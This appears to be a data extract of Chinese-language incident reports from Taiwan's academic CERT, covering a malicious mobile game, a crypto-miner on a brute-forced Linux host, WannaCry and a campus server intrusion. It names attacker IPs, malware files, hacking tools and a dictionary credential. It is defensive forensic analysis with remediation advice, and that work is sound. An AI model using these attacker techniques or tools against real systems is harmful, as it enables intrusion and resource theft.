        "content": "檢測與利用使用者手機上安裝的應用程式漏洞,以安裝惡意與不需要的軟 體,危及受影響手機上所有資料的安全性,可見該遊戲A 存在惡意行為。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 1. 使用者下載與安裝韓國遊戲APP。 2. 連至一個中國IP:123.56.206.59:7878 取得Server 位 置:123.56.205.151:6280 的資訊。 3. 上傳資料給IP:123.56.205.151:6280 的伺服器。 4. 從IP:123.56.205.151:6280 的伺服器下載資料。 5. 每隔一段時間再次連線IP:123.56.205.151:6280。 IV. 建議與總結 因在學術網路中陸續發生許多Android. Congur 資安事件(偵測規則: Android.Congur.Botnet 或MALWARE-CNC Andr.Trojan.Congur variant outbound connection detected),經本中心檢測觸發原因來自一款韓國 的手機遊戲,當使用者於Android 系統玩此遊戲時,會出現連至中國 IP:123.56.205.151:6280 之連線行為,此IP 目前被Fortinet 公司和 AlienVault 公司視為惡意IP,並列入黑名單,建議各學校遇到此類資安 事件時,優先封鎖此惡意IP,封鎖該IP 不影響該遊戲之使用。 ",
        "Page_Num": "12,13"
    },
    "450": {
        "File_Name": "個案分析-校園Linux主機感染挖礦程式事件分析報告_10705.pdf",
        "content": "個案分析- 校園Linux 主機感染挖礦 程式事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年5 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 駭客利用受害主機進行挖礦之攻擊行為在2018 年年初開始越來越頻繁,而挖 礦的攻擊行為可分為一般主機挖礦與瀏覽器的挖礦綁架,其中受害主機所用 的作業系統大都為Windows 系統居多,而Linux 主機感染挖礦程式的現象則 不常見。 2. 本次事件是某學校實驗室學生進行實驗之測試主機被駭客入侵後,對外進行 SSH.Connection.Brute.Force 暴力攻擊事件。檢視資安通報事件單內容,可以 得知該事件的觸發時間點在2018 年4 月17 日02:54:59。 3. 受害主機使用Ubuntu 14.04 LTS 作業系統,該受害主機的使用者表示,因為 是測試用主機,所以在登入系統的密碼設定上使用了弱密碼,可能因此成為 被駭入的目標。 4. 查看該事件的佐證資料內容,發現受害主機對外攻擊多個目的IP,而且所用 的port 皆為22,這些目的IP 所屬國家有中國、巴西、加拿大、立陶宛,法 國、俄羅斯、美國、英國、荷蘭、德國與澳大利亞等11 個國家。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 為了瞭解該類型資安事件的觸發原因與攻擊行為,本中心取得主機樣本後進 行檢測。 II. 事件檢測 1. 首先,檢視受害主機對外開啟port 之情形,發現對外開啟22、80 與8080 等三個port,駭客有可能透過這些開啟的port 入侵。 2. 檢視授權登入系統的紀錄,發現在2018 年4 月16 日20:28 與21:30 有來自 英國IP:178.62.44.104 進行ssh 連線之紀錄,應為駭客侵入系統之時間。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team",
        "Page_Num": "1,2,3,4"
    },
    "451": {
        "File_Name": "個案分析-校園Linux主機感染挖礦程式事件分析報告_10705.pdf",
        "content": "3. 檢視CPU 與記憶體資源使用狀態,發現主機整體CPU 使用率高達100%,其中 執行程式ld-linux-x86-64 (PID:2992)之CPU 使用率將近100%,表示該主機 有挖礦現象,而程式ld-linux-x86-64 可能為一個挖礦程式。 4. 檢視使用者帳戶user 的輸入指令紀錄,發現有段指令很可疑,輸入指令 last(秀出最後登入者為誰)id(檢視目前所用帳戶資訊)w(檢視目前有哪 些使用者登入)netstat(網路通訊連線狀態)sudo su (提升權限至管理 者),可能為駭客所輸入的指令內容。 5. 檢視主機對外連線狀態,發現該主機會連線至法國 IP:217.182.169.148:14444,而該連線對應PID:2992,疑似為一個挖礦連線。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 查看受害主機的排程資訊,發現在/tmp/.xm/內有一個upd 的程式排程,會將 output 結果輸出到dev/null 內,而且內容提到cron.d 的安裝時間為2018 年23:49:31,該時間可能為駭客入侵後執行程式的時間點。 7. 查看auth.log 之內容,發現有許多cron 的session 開啟,而下一秒馬上關 閉的現象,此種開關的情形每隔一分鐘發生,非系統正常行為,疑似因為執 行某種程式造成。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 查看syslog 的內容,發現程式upd 約每1 分鐘執行一次,而且執行的次數非 常頻繁,推測auth.log 紀錄的cron session 開關頻繁現象是因為程式upd 造成的。 9. 查看目前使用者user 有執行哪些程式,發現PID:2992 的程式 ld-linux-x86-64 一直執行著。 10. 尋找程式ld-linux-x86-64 在主機內的所在位置,發現在/tmp/.xm/stak/ 內存在程式ld",
        "Page_Num": "4,5,6"
    },
    "452": {
        "File_Name": "個案分析-校園Linux主機感染挖礦程式事件分析報告_10705.pdf",
        "content": "-linux-x86-64.so.2,與系統本身/lib/x86_64-linux-gnu 資 料夾內的ld-linux-x86-64.so.2 檔案名稱相同,推測它偽裝成系統合法檔案 名稱是為了避免被使用者發現。 11. 查看tmp 資料夾之內容,發現有兩個可疑資料夾.jk 與.xm,內含有可疑檔 案,故這兩個資料夾的資料可能為駭客入侵後所放入。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 檢視.xm 資料夾之內容,發現有許多檔案的產生點在2018 年4 月16 日21:00 過後,與駭客所侵入時間很接近,更加確定這些檔案可能為駭客所放入,其 中有cpu.txt、output.txt 與pools.txt 等3 個文字檔,以及程式x、a、upd、 run、h32、h64 與md32 等7 個執行檔值得深入查看內容。 (1)查看pools.txt 之內容,發現存放礦池與錢包帳戶的相關資訊,如礦池IP 為217.182.169.148:14444、礦池密碼為x、幣別為monero7...等等。 (2)查看out.txt 的內容,可以看到主機成功連線登入礦池與利用CPU 挖礦情形 之報告紀錄,而且這些紀錄的發生起點皆在2018 年4 月16 日 23:49:31,可以  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 確定該挖礦行為是因為駭客入侵後產生的。 (3) 檢視cpu.txt 之內容,可以看到CPU 排程對於挖礦作業的設定內容。 (4)檢視x 執行檔之內容,發現它會忽略SIGHUP 的信號,因此當使用者登出 或斷線後,程式a 仍可正常執行,不會受到任何影響。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (5)檢視a 執行檔之內容,發現它會將程式中echo 開始至exit 結尾之內容送",
        "Page_Num": "6,7,8,9"
    },
    "453": {
        "File_Name": "個案分析-校園Linux主機感染挖礦程式事件分析報告_10705.pdf",
        "content": "入程式upd 內,並且將執行run 後的結果輸出到/dev/null 內。 將程式a 送至Virustotal 網站檢測,得知其惡意比例為1/58,僅有一家防 毒軟體公司可以檢測出它為Linux 系統的木馬程式。 (6)查看程式upd 的內容,發現它最後會執行程式run,並且將結果輸出到 /dev/null 內。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 將程式upd 送至Virustotal 網站檢測,發現其惡意比例為0/59,沒有防毒 軟體公司認為它為惡意程式。 (7)檢視執行檔run 之內容,可以得知程式執行時會判斷是32 位元的作業系 統,還是64 位元的作業系統,本受害主機為64 位元,故會動態載入stak 資料夾內的程式xmr-stak,並且以系統檔案名稱ld-linux-86-64.so.2 呈現 在背景程式執行列表中,藉此隱藏程式xmr-stak 的存在。 (8) 將程式h32 送至Virustotal 網站檢測,發現其惡意比例為33/53,而且 多家防毒軟體公司稱它為ProcHider,是一個將進程隱藏在監視應用程序中 的發布工具,可隱藏程式於背景程式列表中。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (9) 將程式h64 送至Virustotal 網站檢測,發現其惡意比例為31/58,而且 多家防毒軟體公司稱它為HTool、Xhide、Procfake、ProcHider 或HackTool, 為一個駭客工具,也具有隱藏程式於背景程式中執行之功能。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (10) 將程式md32 送至Virustotal 網站檢測,發現其惡意比例為28/60,而 且多家防毒軟體公司稱它為Bitcoinminer,為一個挖礦的惡意程式。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. ",
        "Page_Num": "9,10,11,12,13"
    },
    "454": {
        "File_Name": "個案分析-校園Linux主機感染挖礦程式事件分析報告_10705.pdf",
        "content": "檢視連線礦池(IP:217.182.169.148:14444)的封包內容,可以看到挖礦作業 的id 資訊與挖礦持續進行的現象。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 14. 查看/tmp/.xm/stak 的資料夾內容,發現有兩個可疑程式 ld-linux-x86-64.so.2 與xmr-stak,將兩個程式分別送至Virustotal 網站 檢測。 (1)程式ld-linux-x86-64.so.2:檢測出為惡意程式之比例為0/58。 (2)程式xmr-stak: 檢測出為惡意程式之比例為5/58,而且這5 家防毒軟體 公司稱它為Bitcoinminer,為一個挖礦的惡意程式。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 查看/tmp/.jk 資料夾內容,可以得知有a、bssh 與x 等3 個執行檔,以 及.aa、.d.php、.n、ok 與p 等檔案內容,接著對這些檔案進行內容檢視。 (1)從程式x 的執行檔內容,我們可以得知它會忽略SIGHUP 的信號,因此當 使用者登出或斷線後,程式a 仍可正常執行,並且將執行結果輸出到/dev/null 內。將程式x 送至Virustotal 網站檢測,發現其惡意比例為0/59。 (2)檢視程式a 之內容,發現它會連線到印度IP:139.59.74.88:80 去下載檔 案.d.php 回來,接著會執行程式bssh。將程式a 送至Virustotal 網站檢測, 發現其惡意比例為0/59。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3)查看檔案.d.php 內容,發現有許多以22 開頭的文字組合,疑似為受害主 機對外連線22port 的紀錄。  16 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4)檢視檔案p",
        "Page_Num": "13,14,15,16,17"
    },
    "455": {
        "File_Name": "個案分析-校園Linux主機感染挖礦程式事件分析報告_10705.pdf",
        "content": "之內容,發現僅ftpuser:123 的內容,可能為帳戶名稱ftpuser 與密碼為123,是SSH 自動字典攻擊所常用的帳號與密碼。 (5)查看檔案.aa 之內容,發現有許多以ftpuser:123 之名義對外連線的目的 IP 紀錄,從該紀錄可以得知受害主機對這些連線主機進行漏洞掃描作業。 (6)查看檔案.n 之內容,發現該檔案記錄著以ftpuser:123 之名義對外連線 目的IP 後是否有成功授權登入系統之紀錄,也為該主機對外進行 SSH.Connection.Brute.Force 暴力攻擊的紀錄。  17 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (7)將程式bssh 送至Virustotal 檢測,發現其惡意比例為0/59。 III. 網路架構圖  18 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客透過SSH 連線暴力破解密碼,並以帳戶User 登入系統。 2. 駭客將.jk 與.xm 兩資料夾放入系統資料夾tmp 中。 3. 受害主機SSH 連線開啟Port 22 的主機群,並對連線主機漏洞掃描與試著 暴力破解帳號與密碼登入連線主機。 4. 受害主機執行挖礦程式,並且隱藏程式於背景程式列表中。 IV. 建議與總結 1. 本事件的發生主要是因為使用者使用弱密碼,讓來自英國的駭客以ssh 連 線來暴力破解密碼而侵入主機,並且放入兩個含有SSH 對外攻擊的相關 程式與挖礦程式的資料夾於受害主機內。 2. 駭客為了避免挖礦程式在背景執行時被使用者發現,故將程式名稱隱藏, 以常見的系統執行檔命名。 3. 受害主機所感染的挖礦程式並非不間斷的挖礦程式,從檢測過程中發現它 會以一分鐘為執行單位,來啟動每次的挖礦作業。 4. 為了預防該類型的攻擊事件發生,建議下列幾點措施。  19 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1)為加強系統使用者的密碼強度,",
        "Page_Num": "17,18,19,20"
    },
    "456": {
        "File_Name": "個案分析-校園Linux主機感染挖礦程式事件分析報告_10705.pdf",
        "content": "建議使用8 位數以上中、英文 字母與特殊符號的組合密碼。 (2)隨時監控Linux 系統的CPU 效能,以便即時發現挖礦行為。 (3)檢視主機所有對外連線port 是否有開啟之必要性。 (4)安裝防毒軟體,並定期進行系統掃毒作業。 ",
        "Page_Num": "20"
    },
    "457": {
        "File_Name": "個案分析-校園主機感染WannaCry病毒事件分析報告-10606.pdf",
        "content": "個案分析- 校園主機感染WannaCry 病毒事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年6 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 在今年5 月中旬爆發WannaCry 病毒利用Windows 系統的SMB 漏洞,透過 TCP445 連接埠來傳播,進行大規模攻擊未更新Windows 系統的電腦。 2. 本事件為S 大學之校內一台測試主機發生疑似惡意程式連線行為,對外進行 大量445 連接埠的連線。 3. 該主機為測試用的虛擬主機,所安裝的系統為Windows Server 2008 R2 系統, 而且自今年3 月初過後關機至今年5 月17 日才再次開機。 4. 本單位取得該虛擬主機的樣本後,以還原系統的方式進行研究分析。 II. 事件檢測 1. 首先我們將已感染中毒的虛擬主機在VM 環境內還原,並執行檢測工具來觀 察其程式行為與其對外網路行為。此外,也準備一台Windows 7 系統的待感 染主機,來觀察其病毒感染途徑與網路行為,檢測環境如圖1 所示。 圖1:檢測環境示意圖 2. 以Nmap 工具檢視受測主機對外的連接埠資訊,發現135、445、3389、49154 等連接埠為開啟狀態(如圖2)。 圖2:受檢測主機對外開啟的連接埠資訊  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 透過Currports 工具發現有一個執行中的程式mssecsvc.exe,正在產生大量 對外連線445 連接埠行為,嘗試對外進行連線攻擊(如圖3)。 圖3:mssecsvc.exe 對外連線445 連接埠行為側錄 4. 透過procexp 與procmon 工具檢視背景程式狀態,發現程式mssecsvc.exe 執行時會啟動另一個程式tasksche.exe(如圖4)。 圖4: mssecsvc.exe 執行時啟動tasksche.exe 的紀錄截圖 5. 查看程式mssecsvc.exe 與tasksche",
        "Page_Num": "1,2,3"
    },
    "458": {
        "File_Name": "個案分析-校園主機感染WannaCry病毒事件分析報告-10606.pdf",
        "content": ".exe 的內容,發現此兩個執行檔的建立 日期皆為106 年5 月17 日11:07(如圖5),推測可能為受測主機感染病毒的 時間點。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 圖5:程式mssecsvc.exe 與tasksche.exe 在系統內的建立時間截圖 6. 由事件檢視紀錄,發現到兩程式mssecsvc.exe 與tasksche.exe 在建立時只 有mmsecsvc.exe 成功執行(如圖6),而程式tasksche.exe 啟用失敗,並且 發生不正確的XML 語法錯誤(如圖7)。 圖6:在11 時7 分系統執行mssecsvc.exe 成功的紀錄 圖7:在11 時7 分系統執行tasksche.exe 啟動失敗的紀錄 7. 因為受測主機存在mssecsvc.exe 與tasksche.exe 兩程式,又有大量以445 連接埠對外連線攻擊的行為,因此推斷受測主機可能感染到WannaCry 病毒。 接著搜尋主機內是否存在該病毒特徵:tasksche.exe 執行後會產生的三個檔  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 案(@WanaDecryptor@.exe、Taskdk.exe 與Taskdl.exe),結果無法搜尋到, 可能與tasksche.exe 無法被成功開啟有關。 8. 從封包內容檢視,經觀察程式mssecsvc.exe 於執行初期,會嘗試對網域名稱 伺服器(DNS)發出網域名稱解析請求,網域名稱為 www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com(如圖8)。 圖8:受測主機向網域名稱伺服器(DNS)發出請求網域名稱之紀錄 9. 檢視封包內容與對程式mssecsvc.exe 進行逆向工程,發現mssecsvc.exe 會 檢查www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com ",
        "Page_Num": "3,4,5"
    },
    "459": {
        "File_Name": "個案分析-校園主機感染WannaCry病毒事件分析報告-10606.pdf",
        "content": "網址是否可以 連線,若無法連線會繼續進行後續程式行為,判斷該網址為一個Kill-Switch 的網址(如圖9、圖10 與圖11)。 圖9:mssecsvc.exe 之逆向工程內容中連結Kill-Switch 網址的佐證資訊 其中圖10 為DNS 回覆給受測主機Kill-Switch 網址的網域名稱解析內容,共 對應到5 台主機的IP 位址,第一台主機為104.17.37.137。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 圖10: DNS 回覆受測主機所查詢的網域名稱之紀錄 圖11 為受測主機140.x.x.43 連線到Kill-Switch 網址的主機104.17.37.137 之封包來往紀錄,由圖中可以判斷有成功連線。 圖11:受測主機連線至DNS 所回覆的網站IP 位址 (104.17.37.137)之封包紀 錄 10. 以Nmap 工具檢視Kill-Switch 網址所對應主機104.17.37.137 對外的連接 埠資訊,發現443、80、8080、8443 等連接埠為開啟狀態(如圖12),表示該 網址目前的80 連接埠是可連線的。 圖12:104.17.37.137 主機對外開啟的連接埠資訊 受測主機 DNS  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 檢視受測主機連到Kill-Switch 網址後的封包內容,發現該網頁內容無法被 正常顯示(如圖13),可見該網址只是單純作為程式判斷是否可以連線的用 途。 圖13:受測主機連到Kill-Switch 網址的封包解析內容 12. 將www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com 網址送到 Virustotal 檢測是否為惡意網站,檢測比率為2/65,為「非惡意網站」的 比例相當高,表示該網站目前是安全網站(如圖14)。  7 臺灣學術網路危機處理中心",
        "Page_Num": "5,6,7,8"
    },
    "460": {
        "File_Name": "個案分析-校園主機感染WannaCry病毒事件分析報告-10606.pdf",
        "content": "(TACERT) TANet Computer Emergency Response Team 圖14:www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com 網址於 Virustotal 網站的檢測結果 13. 從該主機在開機7 小時的短暫測試期間內,至少對外進行69 萬7,488 次445 連接埠攻擊(如圖15),若以國別來分有232 個國家受影響(如圖16),可見 其散播速度之快與影響範圍之大。 圖15:受測主機對外連線445port 的連線數量統計 圖16:受測主機對外連線445port 的受影響國家數量統計 14. 將程式樣本mssecsvc.exe 送到Virustotal 檢測,檢測為惡意的比例為57/61 相當明顯(如圖17),但仍然有4 家防毒公司的軟體尚未檢測出其為惡意程 式。(如圖18)。 圖17: mssecsvc.exe 於Virustotal 網站的檢測結果  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 圖18: 無法檢測出惡意程式mssecsvc.exe 的防毒公司名單 15. 另一支程式tasksche.exe 透過Virustotal 檢測,檢出比例為55/61 相當高 (如圖19),但有6 家防毒公司的軟體尚未檢測出其為惡意程式(如圖20)。 圖19: tasksche.exe 於Virustotal 網站的檢測結果 圖20: 無法檢測出惡意程式tasksche.exe 的防毒公司名單 16. 觀察待感染主機發現,當受測主機對外進行445 port 連線時,會用匿名連 線方式與待感染主機建立連線(如圖21),之後兩個程式mssecsvc.exe 與 tasksche.exe 開始安裝與執行(如圖22 與圖23),經與受測主機的事件檢視 紀錄比對,發現受測主機與待感染主機兩者行為相同。 圖21:受測主機以匿名連線方式連入待感染主機的封包側錄  9 臺灣學術網路危機處理中心(TACERT) TANet",
        "Page_Num": "8,9,10"
    },
    "461": {
        "File_Name": "個案分析-校園主機感染WannaCry病毒事件分析報告-10606.pdf",
        "content": "Computer Emergency Response Team 圖22:mssecsvc.exe 安裝於待感染主機的事件紀錄 圖23:taskche.exe 在待感染主機內啟用失敗的事件紀錄 III. 網路架構圖 1. 駭客散播惡意程式,以匿名方式445port 連線受害者主機。 2. 植入惡意程式mssecsvc.exe 於受害主機,該程式會呼叫與執行另一個惡 意程式tasksche.exe。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. mssecsvc.exe 進行DNS 名稱解析。 4. 受害者主機對外進行大量445 port 攻擊。 5. 受害者主機植入惡意程式到受感染主機。 IV. 建議與總結 此個案為電腦未執行系統更新來修補SMB 漏洞,而被駭客透過開啟的445 port 植入惡意程式。為有效預防感染WannaCry 病毒,建議使用者進行下列 的防禦措施: 1. 關閉 Windows 系統的 445 通訊埠。 2. 立即使用隨身碟、外接硬碟或者雲端空間,備份重要資料。 3. 使用 Windows Update 自動更新或手動更新微軟 KB4012215 的漏洞修補 程式(漏洞編號 MS17-010)。 4. 確認防毒軟體已更新至最新版本病毒碼與偵測程式碼,並定期執行電腦掃 毒作業。 V. 相關報導 1. http://www.ithome.com.tw/news/114144  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. http://www.ithome.com.tw/news/114148 ",
        "Page_Num": "10,11,12"
    },
    "462": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": "校園伺服器主機群遭受駭客 入侵攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2018 年12 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 2018/11 初某學校通報該校公文系統疑似遭植入惡意程式,並且曾請資安公司 檢測該公文系統主機,從資安公司的檢測報告得知在主機內有1.asp 的一句話 木馬與l.log 可疑dump 檔案,此兩個檔案建立時間皆為2018/10/10,而且檔 案擁有者皆為DefaultAppPool。 2. 資安公司發現駭客使用來自日本IP:54.250.25.212 於2018/10/10 10:28 開始存 取公文系統,並於2018/10/10 10:29 透過upload_resource.aspx 植入1.asp 與 1.log 檔案。 3. 在報告中提到於Event Log 發現2018/10/10 當天有其他主機以Administrator 帳號登入公文系統,但目前無證據指出為同一件資安事件。 (1)2018/10/10 16:56 來源主機:140.X.X.237 使用Administrator 以RDP 方式成 功登入。 (2) 2018/10/10 16:56 來源主機CC2011-1(IP: 140.X.X.237)使用Administrator 以網芳連線方式成功登入。 (3)2018/10/10 公文系統主機使用帳號water 來嘗試連線cluster1 主機與使用帳 號administrator 來嘗試連線fintec 主機。 4. 為了解該主機被駭情形與駭客入侵手法,本中心進行實機鑑識。 II. 事件檢測 1. 首先,從公文系統主機(IP:140.X.X.239)的事件檢視紀錄發現: (1) 在2018/10/10 11:04 開始陸續有來自校園IP:140.X.X.237(主機名稱 CC2011-1)的網芳連線或RDP 連線,其中RDP 遠端桌面連線有3 次皆以 帳戶Administrator 登入,可見駭客知道Administrator 的密碼。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) 在2018/10/10 有許多",
        "Page_Num": "1,2,3"
    },
    "463": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": "使用虛擬帳戶DefaultAppPool 的網路服務之連線。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 檢視IP:140.X.X.237 主機的資源回收桶,發現有3 個在2018/10/10 13:13 與 13:23 被刪除的檔案。 查看這3 個檔案內容,得知下列資訊: (1) ipc_pass.dic 疑似為一個keylog 檔。 (2) ipc_user.dic 僅存放administrator 在內容中。 (3) NTscan.txt 內容提到IP:140.X.X.56 與系統管理者帳戶water 的密碼,透過 該資料可以得知駭客明確地知道帳戶water 的密碼。 3. 校方告知該帳號water 為該校系統管理員所用帳戶,該員管理多台校園伺服 器,而且都使用同一帳戶water 與使用同一組密碼Rstxxxxxxxxx107。 4. 校方告知該員在2018/10/10 國定假日當天未使用帳號登入該校任一系統,推 測2018/10/10 當天使用帳戶water 登入主機的紀錄必定為駭客所為。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 查看IP:140.X.X.237 主機之事件檢視器紀錄,發現2018/10/31 以前的紀錄皆 已被刪除,推測可能為駭客所為。 6. 檢視有使用water 帳戶的9 台伺服器的EventLog,又因所用分析工具的數據 與主機時間有8 小時時差,故凡是該工具的數據圖示其時間皆須加8 小時才 是當時事件時間。 (1) IP:140.X.X.237 主機在2018/10/10 10:54 被來自美國IP:45.199.182.10 以使 用者water 的帳戶登入,進行RDP 連線,連線期間曾經有來自台灣 IP:210.65.89.8 於2018/10/10 14:27 使用RDP 方式連線該主機。(註: 下圖 時間需加8 小時) (2) IP:140.X.X.237 主機在2018/10/9 12:54 有許多不明來源的遠端登入失敗紀 ",
        "Page_Num": "3,4,5"
    },
    "464": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": "錄,疑似為駭客嘗試暴力破解密碼造成。(註: 下圖時間需加8 小時)  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 駭客透過IP:140.X.X.237 主機在2018/10/10 使用網路或RDP 方式依序連 線登入下列主機: IP:140.X.X.57、140.X.X.239、140.X.X.56、140.X.X.76、140.X.X.78、 140.X.X.77、140.X.X.79,也在2018/10/11 13:31 開始陸續使用Nmap 掃描 這些主機與IP:140.X.X.238 主機。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4) 匯整IP:140.X.X.237 主機所連線8 台主機的紀錄,發現有3 台主機連線次 數較高,各主機連線時間與連線次數統計如下表,建議檢視這些主機的資 安防護措施是否存在。 IP 連線時間 次數 140.X.X.239 10/10 11:04、11:06、13:24、16:56 10/11 13:45(Nmap) 5 140.X.X.57 10/10 11:03、12:27、12:50、13:14、13:24、15:01、 15:23 10/11 13:34(Nmap)、13:56 9 140.X.X.56 10/10 12:27、12:28、13:09、13:15、13:23、13:24、 13:25、15:23 10/11 13:31(Nmap)、13:34(Nmap)、13:35(Nmap) 11 140.X.X.76 10/10 16:33、10/11 13:35(Nmap) 2 140.X.X.78 10/10 16:43、10/11 13:35(Nmap) 2 140.X.X.77 10/10 16:48、10/11 13:43(Nmap) 2 140.X.X.79 10/10 17:14、10/11 13:35(Nmap)、13:36(Nmap) 3 140.X.X.238 10/11 13:45(Nmap)、13:46(Nmap) 2 7. 檢視IP:140.X.X",
        "Page_Num": "5,6,7"
    },
    "465": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": ".237 主機之瀏覽器歷史紀錄,發現駭客入侵該主機後,曾經 訪問學校首頁與一些校內主機的網站,其中以http://140.X.X.12 被駭客訪問的 次數最多,此外駭客也下載與安裝Nmap 軟體。(註:下圖時間需加8 小時) 8. 檢視IP:140.X.X.237 主機的port 開啟狀況,發現該主機開啟135、139、445 與3389 等這些容易被駭客攻擊的port,需檢視這些port 是否有開啟之必要性。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 檢視IP:140.X.X.237 主機的程式安裝內容,發現到駭客曾於2018/10/10 安裝 四個程式,其中Nmap7.70 是一個開放原始碼的網路掃描與探測工具,可以 讓網路管理者掃描整個子網域或主機的連接埠等,透過它駭客可以確認主機 是否有開機,並且知道主機有開啟哪些連接埠。 10. 在IP:140.X.X.237 主機的桌面看到可疑程式netpass.exe,查看內容發現該程 式是在2018/10/10 14:52 建立,推測為駭客入侵主機後所用工具,Netpass 是 一個讓網路密碼復原的偵測工具,可被駭客用來竊取密碼用,為有名的駭客 工具之一。 netpass.exe 經virustotal 檢測其惡意比例為26/67,有多家防毒軟體公司使用 HackTool、HTool、PSWTool 與PasswordRevealer 等用字命名它,可以確定此 程式為一個竊取密碼的工具。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 查看IP:140.X.X.237 主機之C:\\Windows 資料夾內容,發現程式 RegBootClean64.exe 在2018/10/10 13:12 曾被執行,該程式為趨勢科技的註冊 碼重新開機後清除程式,可刪除死的和損壞的註冊碼,推測駭客可能利用該 工具清除主機內的註冊碼資訊。  9 臺灣學術網路",
        "Page_Num": "7,8,9,10"
    },
    "466": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
        "content": "危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 在IP:140.X.X.237 主機的C: \\使用者\\water\\AppData\\Local\\VirtualStore 資料夾 內,發現一個在2018/10/10 15:14 建立的檔案iisputlist.txt,查看檔案內容可以 看到有許多區域網路IP 與445port,推測此為駭客掃描區域網路內各IP 主機 之445 port 是否有開啟的紀錄。 13. 在IP:140.X.X.237 主機上開啟遠端桌面連線軟體,發現該主機曾經連線多台 區域網路中的主機,其中包含公文系統主機(IP:140.X.X.239),建議查看這些 主機是否有water 帳戶與是否有駭客入侵現象。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 14. 在IP:140.X.X.237 主機之C:\\使用者\\All Users 與C:\\ProgramData 這兩個資料 夾內,發現四個可疑檔案同時出現在這兩個資料夾中,其中NTscan.txt 即是 前面所提到含有water 帳號與密碼的檔案,分析這些檔案得知如下內容。 (1) ew.exe經Virustotal檢測其惡意比例為39/65,有多家防毒軟體公司以HackTool 用字命名它,可見它為一個駭客工具。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) IISPutScanner.exe 經Virustotal 檢測其惡意比例為7/66,僅7 家防毒軟體公司 可以檢測出它的存在,而且有防毒軟體公司用HTool 命名它,推測它應為一 個駭客工具,而且該工具主要用來掃描主機是否存在IIS 漏洞。 (3) Putty.exe 經Virustotal 檢測其惡意比例為0,事實上該工具是一個可以在 Windows 平台上進行SSH 連線的免費軟體,本身非惡意程式,但是駭客可以 使用它來對受害主機進行SSH 連線。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 檢視IP:140.X",
        "Page_Num": "10,11,12,13"
    },
    "467": {
        "File_Name": "個案分析-校園伺服器主機群遭受攻擊事件分析報告_10712.pdf",
